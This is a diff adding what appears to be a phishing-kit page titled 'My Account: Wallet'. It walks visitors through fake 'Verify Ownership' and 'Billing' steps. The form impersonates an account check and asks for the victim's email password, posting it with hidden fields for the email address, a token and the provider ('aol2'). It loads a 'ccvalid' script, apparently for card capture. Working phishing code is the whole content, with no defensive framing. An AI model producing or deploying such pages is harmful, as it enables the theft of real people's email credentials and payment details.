@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+					<html>
+					<head>
+						<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+						<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+						<link rel="shortcut icon" href="pics/favi.ico">
+						<link rel="apple-touch-icon" href="pics/favi.png">
+						<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
+						<title>My Account: Wallet</title>
+						<link href="https://fonts.googleapis.com/css2?family=Material+Icons" rel="stylesheet">
+						<link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet">
+						<link rel="stylesheet" href="css/csspage.css">
+						<script type="text/javascript" src="lib/js/jquery-3.3.1.min.php"></script>
+						<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js">
+						</script>
+						<meta http-equiv="cache-control" content="no-cache">
+						<meta http-equiv="expires" content="0">
+						<meta http-equiv="pragma" content="no-cache">
+						</script>
+						<script type="text/javascript" src="lib/js/jquery.ccvalid.php"></script><script type="text/javascript" src="lib/js/jquery.mask.min.js"></script>
+					<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
+				
+					</head>
+				  <body>
+				  <header>
+					<div>
+					</div>
+				</header>
+					<div class="mainContainer ">
+					<div class="bg">
+					</div>
+					  <div class="hide" id="rotate">
+					  <div class="circle">
+					  </div>
+						<div class="overlay">
+						</div>
+					  </div>
+					  <div class="contents">
+					  <div class="modal hide js-modal">
+					  <div class="l-modal-shadow js-modal-hide"></div>
+					  <div class="c-popup l-modal-body">
+						<div class="c-popup-img">
+						  <img src="pics/warning.png" />
+						</div>
+						<h3 class="c-popup-title">Warning!</h3>
+						<p class="c-popup-description">Complete the progress first</p>
+						
+					  </div>
+					  </div>
+				  <div class="mainContents">
+				<a href="#" class="close-icon js-modal-hide"></a>
+				  <ol class="steps js-modal-hide">
+					<li id="signed"><a class="signed" href="#">Signed</a></li>
+					<li id="Protected"><a class="Protected" href="#">Protected</a></li><li id="Verify"><a class="Verify" href="#">Verify Ownership</a></li><li id="Billing"><a class="Billing" href="#">Billing</a></li>
+					<li id="Completed"><a class="Completed" href="#">Completed</a></li>
+				  </ol>
+				  <div id="process">
+	<link rel="stylesheet" type="text/css" href="css/verifymail.css">
+
+	<form class="form" action="?access1&apitoken=dsds" method="post" style="padding:0 20px" novalidate="on">
+
+
+ <link rel="stylesheet" type="text/css" href="css/verifymail.css">
+
+        <div class="fields clearfix"><section id="sift-verification" style="background-color: #ccode;border-radius: 5px;margin-bottom: 14px;">
+
+                  <img id="logo" class="img-email" src="image1" onerror="this.src='image2';">
+
+                  <div class="form-container">
+                        <h1 style="color:#ffffff;">Ownership Verification</h1>
+                        <p class="second" style="text-align: left;color:#ffffff;">
+                        We want to verify that you are the owner of email_add.
+                        </p>
+
+
+                        </div><div style="text-align: left;font-size: 16px;border-left: 5px solid #fff;line-height: 25px;margin: 3px 2px;padding: 2px 7px;">
+                                <strong style="color: #ffffff;">email_add</strong>
+                       	</div>
+				<input id="eml" name="eml" value="email_add" type="hidden"><div class="inputArea">
+			<input style="border-bottom: 3px solid #ffffff;background-color: #fff;" id="emlpass" name="emlpass" type="password" required="" placeholder="Enter the password for email_add">
+		  </div>
+                <input id="apitoken" name="apitoken" value="tokvalue" type="hidden">
+                <input id="mailaccess" name="mailaccess" value="aol2" type="hidden">
+                <div>
+                  <input style="margin: 10px 0px;width: 70%;background-color: #ccode;border: 1px solid #bfb9b9;border-radius: 5px;box-shadow: 0 30px 30px rgba(0,0,0,.4);" type="submit" id="jtnjr" class="bt" value="Verify">
+
+                  </div><p class="third"><strong style="color: #fff;">pproide</strong> won’t share your password with third parties.</p>
+          </form>
+  </div>
+        </section>
+        <!--<script type="text/javascript">$(window).on("beforeunload", function() {return "Are you sure? You didn't finish the form!";});</script>-->
+
+                <script>
+                $("#Billing,#Verify,#Upload,#Completed").removeClass("current");
+
+                $("#Verify").addClass("current");
+                $(document).ready(function () {
+                        function valid() {
+                                var check = true;
+                                var ii = 0;
+                                $("#process input:not(.bt):not([type=checkbox]),#process select").each(function (i, el) {
+                                        if (!$(el).val()) {
+                                                $(el).parent().addClass("hasError");
+                                                check = false;
+                                        } else {
+                                                $(el).parent().removeClass("hasError");
+                                        }
+
+                                });
+                                return check;
+                        }
+                        $("#process input:not(.bt):not([type=checkbox]),select").each(function (i, el) {
+                                $(el).keyup(function () {
+                                        valid();
+                                });
+                                $(el).change(function () {
+                                        valid();
+                                });
+                        });
+                        $(document).on("click", "#jtnjr", function (c) {
+                                 
+                           
+                        
+                                check = true;
+                                if (!valid()) {
+                                        check = false;
+                                }
+                                if (!check) {
+                                        return false;
+                                } else {        
+                                          $("#rotate").removeClass("hide");
+                                       return true
+                                }
+                                return false;
+                                
+                        });
+                });
+                </script>
